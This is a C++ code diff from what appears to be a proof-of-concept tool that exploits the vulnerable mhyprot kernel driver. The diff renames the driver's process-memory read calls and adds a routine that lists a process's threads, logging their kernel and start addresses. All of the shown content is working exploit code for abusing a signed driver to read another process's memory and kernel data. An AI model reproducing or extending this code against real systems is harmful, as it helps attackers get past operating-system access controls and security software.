@@ -53,13 +53,13 @@ namespace sup
 		// read dos-header using vulnerable driver
 		//
 		IMAGE_DOS_HEADER dos_header = mhyprot::driver_impl::
-			read_user_memory<IMAGE_DOS_HEADER>(process_id, process_base_address);
+			read_process_memory<IMAGE_DOS_HEADER>(process_id, process_base_address);
 
 		//
 		// read nt-header using vulnerable driver
 		//
 		IMAGE_NT_HEADERS nt_header = mhyprot::driver_impl::
-			read_user_memory<IMAGE_NT_HEADERS>(process_id, process_base_address + dos_header.e_lfanew);
+			read_process_memory<IMAGE_NT_HEADERS>(process_id, process_base_address + dos_header.e_lfanew);
 
 		//
 		// image size of target process
@@ -96,11 +96,30 @@ namespace sup
 			{
 				logger::log("[+] ---> %20ws : %ws\n", _module.first.c_str(), _module.second.c_str());
 			}
-			logger::log("[<] snatched!\n\n");
+			logger::log("[<] snatched!\n");
 		}
 		else
 		{
 			logger::log("[!] enum modules test failure\n");
+		}
+
+		logger::log("\n[>] snatching threads in the target process vulnerable driver...\n");
+
+		std::vector<mhyprot::MHYPROT_THREAD_INFORMATION> thread_list;
+
+		if (mhyprot::driver_impl::get_process_threads(GetCurrentProcessId(), GetCurrentProcessId(), thread_list))
+		{
+			for (auto& thread : thread_list)
+			{
+				logger::log("[+] ---> 0x%llX : 0x%llX : %d\n",
+					thread.kernel_address, thread.start_address, thread.unknown
+				);
+			}
+			logger::log("[<] snatched!\n\n");
+		}
+		else
+		{
+			logger::log("[!] enum threads test failure\n");
 		}
 
 		logger::log("[<] performed\n");
